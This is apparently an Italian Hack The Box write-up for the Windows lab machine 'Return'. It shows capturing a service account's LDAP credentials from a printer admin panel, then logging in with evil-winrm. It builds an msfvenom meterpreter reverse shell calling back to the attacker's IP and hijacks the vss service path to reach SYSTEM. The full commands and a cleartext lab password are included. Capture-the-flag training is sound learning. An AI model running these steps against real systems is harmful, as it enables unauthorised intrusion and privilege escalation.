IP vittima: 10.10.11.108 
IP attacante: 10.10.14.15
## Recon

Macchina windows - [[active directory]]

`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.108`
``` bash
Completed SYN Stealth Scan at 21:57, 12.84s elapsed (65535 total ports)
Nmap scan report for 10.10.11.108
Host is up, received user-set (0.023s latency).
Scanned at 2025-10-28 21:57:06 CET for 13s
Not shown: 65352 closed tcp ports (reset), 157 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49681/tcp open  unknown          syn-ack ttl 127
49684/tcp open  unknown          syn-ack ttl 127
49699/tcp open  unknown          syn-ack ttl 127
49723/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.92 seconds
           Raw packets sent: 68757 (3.025MB) | Rcvd: 65466 (2.619MB)
```

`sudo nmap -sC -sV -O -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.11.108 -oN servizi;`
``` bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-28 21:59 CET
Nmap scan report for 10.10.11.108
Host is up (0.023s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-28 21:18:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows 2019|2012|2022|10|2016|2008|7|Vista|Longhorn (95%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_10:1511 cpe:/o:microsoft:windows_vista::sp1:home_premium cpe:/o:microsoft:windows
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows 10 1909 (92%), Microsoft Windows 10 1709 - 1909 (87%), Microsoft Windows Server 2012 (87%), Microsoft Windows Server 2012 or Server 2012 R2 (87%), Microsoft Windows Server 2016 (87%), Microsoft Windows 10 1703 (86%), Microsoft Windows Server 2008 R2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-28T21:18:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 18m36s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.03 seconds
```

Proviamo la porta samba (445)
`smbclient -L \\10.10.11.108` senza password -> non si trova nulla

Proviamo [[enum4linux]]
`enum4linux -a 10.10.11.108` -> trova sola Domain Name: RETURN
## Foothold
Visitiamo il sito html (http://10.10.11.108:80), pagina `settings`. 
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251028220328.png)

Vediamo cosa succede cliccando su `update` utilizzando [[burpsuite]]. Catturiamo, mandiamo al repeater, cambiamo il parametro `ip=printer.return.local `con `ip=<nostro IP>`, ci mettiamo in ascolto sulla nostra porta `389` (sudo nc -nlvp 389), che è la server port, e poi mandiamo con send 
-> siamo dentro (è una dashboard amministrativa di una stampante) e vediamo subito una password: 

``` bash
Connection received on 10.10.11.108 58114
0*`%return\svc-printer 
                       1edFg43012!!
```

User: svc-printer
Password: 1edFg43012!!
### Evil-winrm
Usiamo [[evil-winrm]]sul servizio winrm che utilizza la porta 5985 che abbiamo visto essere aperta. [[evil-winrm]]ha lo scopo di creare una shell se si dispone delle utenze. Verranno usate quelle scoperte in precedenza.
`evil-winrm -i '10.10.11.108' -u 'svc-printer' -p '1edFg43012!!'`
Stabiliamo una connessione con l'endpoint remoto
``` bash
❯ evil-winrm -i '10.10.11.108' -u 'svc-printer' -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
```

Comandi utili (cmd e powershell):
`net user`: restituisce gli utenti presenti sul sistema
``` bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt
svc-printer
The command completed with one or more errors.
```

`net group`: restituisce i gruppi disponibili nel sistema
``` bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net group

Group Accounts for \\

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
The command completed with one or more errors.
```

`net group "Domain Users"` restituisce gli utenti aggiunti ad [[active directory]]
``` bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net group "Domain Users"
Group name     Domain Users
Comment        All domain users

Members

-------------------------------------------------------------------------------
Administrator            krbtgt                   svc-printer
```

`net group "Domain Admins"` restituisce gli amministratori
``` bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net group "Domain Admins"
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator
```

`net user svc-printer` restituisce le caratteristiche dell'utente svc-printer
``` 
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2021 1:39:29 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
```
svc-printer fa parte del gruppo `*Server Operators`, questo è l'errore di configurazione che consentirà di scalare i privilegi.
## Privilege escalation

Tramite [[evil-winrm]]possiamo caricare file in upload, ad esempio una shell di meterpreter, poi con la shelle di meterpreter si potrà provare a ottenere system e rendere persistente la shell.
Prepariamo la shell con [[msfvenom]]

`msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.15 lport=4444 -f exe -o shell.exe`

Poi la carichiamo con il comando `upload shell.exe` lanciato nella macchina vittima
``` bash
❯ evil-winrm -i '10.10.11.108' -u 'svc-printer' -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload shell.exe
                                        
Info: Uploading /home/parrot/Macchine/HackTheBox/Return/shell.exe to C:\Users\svc-printer\Documents\shell.exe
                                        
Data: 98400 bytes of 98400 bytes copied
                                        
Info: Upload successful!
```

Avviamo [[msfconsole]]e utilizziamo l'exploit `multi/handler` con queste opzioni:
``` 
Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```

Mandiamo in ascolto con run poi torniamo sulla macchina vittima è facciamo partire la shell (.\shell.exe)
Viene aperta la shell meterpreter con user RETURN\svc-printer
### winpeas
copiamo [[winpeas]] nella cartella di lavoro in modo da poterla uploadare sulla macchina vittima
sulla macchina vittima lanciamo `upload winPEASany.exe` per effettuare l'upload
poi lanciamo lo script `./winPEASany.exe > peas_output.txt` salvando l'output su un file di testo da portare poi sulla nostra macchina per analizzarlo con `download peas_output.txt`.

L'output mostra una lunga di servizi che l'utente (la stampante) può stoppare o avviare (questo era l'errore di configurazione visto prima). Occorre modificare il percorso dell'eseguibile che viene lanciato quando viene avviato un servizio di livello SYSTEM/ADMINISTRATOR, mettendo una shell che sarà avviata con privilegi di administrator

Torniamo nella shell di meterpreter, avviamo la shell con il comando `shell`. Qui possiamo interrogare i servizi con `sc query <SERVIZIO>`, ad esempio `sc query bowser`
```
C:\Users\svc-printer\Documents>sc query bowser
sc query bowser

SERVICE_NAME: bowser 
        TYPE               : 2  FILE_SYSTEM_DRIVER  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
con `sc qc <SERVIZIO>` vediamo il percorso dell'eseguibile, ad esempio `sc qc bowser`
```
C:\Users\svc-printer\Documents>sc qc bowser
sc qc bowser
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: bowser
        TYPE               : 2  FILE_SYSTEM_DRIVER 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : system32\DRIVERS\bowser.sys
        LOAD_ORDER_GROUP   : Network
        TAG                : 5
        DISPLAY_NAME       : Browser
        DEPENDENCIES       : 
        SERVICE_START_NAME : 
```

Modificheremo il percorso del servizio `vss` che è stopped
```
C:\Users\svc-printer\Documents>sc query vss
sc query vss

SERVICE_NAME: vss 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

e ha questo percorso:
```
C:\Users\svc-printer\Documents>sc qc vss
sc qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem

C:\Users\svc-printer\Documents>
```

Quindi cambiamo percorso di vss con quello della shell di meterpreter che abbiamo giù usato /shell.exe) con il comando `sc config vss binPath="C:\Users\svc-printer\Documents\shell.exe"`

Apriamo un'altra sessione di msfconsole e usiamo multi/handler con le stesse opzioni di prima:
```
Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```

Torniamo sulla macchina vittima e avviamo il servizio vss con `sc start vss`
In msfconsole verrà avviata la shell meterpreter con privilegi `NT AUTHORITY\SYSTEM`
Occorre migrare subito il servizio su uno più stabile, sempre con privilegi `NT AUTHORITY\SYSTEM` (ad esempio ismserve.exe) con `migrate <PID SERVIZIO>`
In meterpreter avviamo la shell con il comando `shell`
La flag user si trova nel file `user.txt` in `C:\Users\svc-printer\Desktop` 
La flag root si trova nel file `root.txt` in `C:\Users\Administrator\Desktop`
